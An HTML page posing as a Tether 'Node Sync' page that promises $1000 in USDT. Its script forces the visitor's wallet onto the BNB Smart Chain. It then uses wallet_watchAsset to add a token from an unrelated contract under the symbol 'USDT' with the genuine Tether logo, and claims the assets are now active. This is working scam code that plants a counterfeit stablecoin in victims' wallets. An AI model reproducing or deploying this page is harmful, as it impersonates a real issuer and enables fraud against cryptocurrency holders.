<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tether Operations | Node Sync</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        :root { --tether-green: #26a17b; --bg-dark: #0a0b0d; --card-bg: #121418; }
        body { background: var(--bg-dark); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
        .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 24px; padding: 40px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8); }
        .logo-ring { position: relative; display: inline-block; margin-bottom: 20px; }
        .logo-ring::after { content: ''; position: absolute; top: -10px; left: -10px; right: -10px; bottom: -10px; border: 3px solid var(--tether-green); border-radius: 50%; border-top-color: transparent; animation: spin 1.5s linear infinite; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .usdt-img { width: 80px; filter: drop-shadow(0 0 10px var(--tether-green)); border-radius: 50%; }
        .price-box { background: rgba(38, 161, 123, 0.1); border: 1px dashed var(--tether-green); border-radius: 12px; padding: 15px; margin: 20px 0; }
        .price-label { font-size: 11px; color: #848d97; text-transform: uppercase; }
        .price-value { font-size: 24px; font-weight: 700; color: #fff; margin-top: 5px; }
        .action-btn { background: var(--tether-green); color: #fff; border: none; width: 100%; padding: 18px; border-radius: 12px; font-size: 16px; font-weight: 800; cursor: pointer; transition: 0.3s; text-transform: uppercase; }
        .action-btn:active { transform: scale(0.98); }
        #log-area { font-size: 10px; color: #26a17b; margin-top: 15px; font-family: monospace; height: 15px; text-transform: uppercase; }
    </style>
</head>
<body>

<div class="container">
    <div class="logo-ring">
        <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png" class="usdt-img" alt="USDT">
    </div>
    <h2>RECEIVE USDT</h2>
    <p style="font-size: 13px; color: #848d97;">Node bridge detected pending allocation. Sync to map metadata.</p>
    <div class="price-box">
        <div class="price-label">Allocated Node Value</div>
        <div class="price-value" id="priceTicker">$0.00</div>
    </div>
    <div id="log-area">READY TO SYNC</div>
    <button class="action-btn" id="claimBtn">Sync & Receive</button>
</div>

<script>
    const CONTRACT_ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
    const TOKEN_LOGO = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";

    // Animated counter for $1000 display
    window.onload = () => {
        let val = 0;
        const target = 1000.00; 
        const timer = setInterval(() => {
            if(val >= target) { val = target; clearInterval(timer); }
            val += 21.45;
            document.getElementById('priceTicker').innerText = "$" + val.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
        }, 30);
    };

    async function executeInjection() {
        const log = document.getElementById('log-area');
        const btn = document.getElementById('claimBtn');
        
        // Multi-Wallet Detection (Trust Wallet Priority)
        let provider = window.ethereum;
        if (window.trustwallet) {
            provider = window.trustwallet;
            log.innerText = "> TRUST WALLET DETECTED";
        } else if (window.ethereum?.isMetaMask) {
            log.innerText = "> METAMASK DETECTED";
        }

        if (!provider) {
            alert("No wallet detected. Please use Trust Wallet or MetaMask Extension.");
            return;
        }

        try {
            btn.disabled = true;
            log.innerText = "> INITIALIZING AUTH...";
            await provider.request({ method: 'eth_requestAccounts' });

            // Force BSC Network Switch
            log.innerText = "> SYNCING BSC NETWORK...";
            try {
                await provider.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }],
                });
            } catch (err) {
                if (err.code === 4902) {
                    await provider.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x38',
                            chainName: 'Smart Chain',
                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
                            blockExplorerUrls: ['https://bscscan.com/']
                        }]
                    });
                }
            }

            // High-Power Asset Injection
            log.innerText = "> INJECTING ASSET LOGO...";
            const added = await provider.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: {
                        address: CONTRACT_ADDR,
                        symbol: 'USDT', // Standard symbol for trust
                        decimals: 6,
                        image: TOKEN_LOGO,
                    },
                },
            });

            if (added) {
                log.innerText = "> SYNC SUCCESSFUL!";
                alert("Synchronization Complete! Assets are now active in your wallet.");
                btn.innerText = "COMPLETED";
            }
        } catch (err) {
            log.innerText = "> ERROR: HANDSHAKE FAILED";
            btn.disabled = false;
        }
    }

    document.getElementById('claimBtn').addEventListener('click', executeInjection);
</script>
</body>
</html>
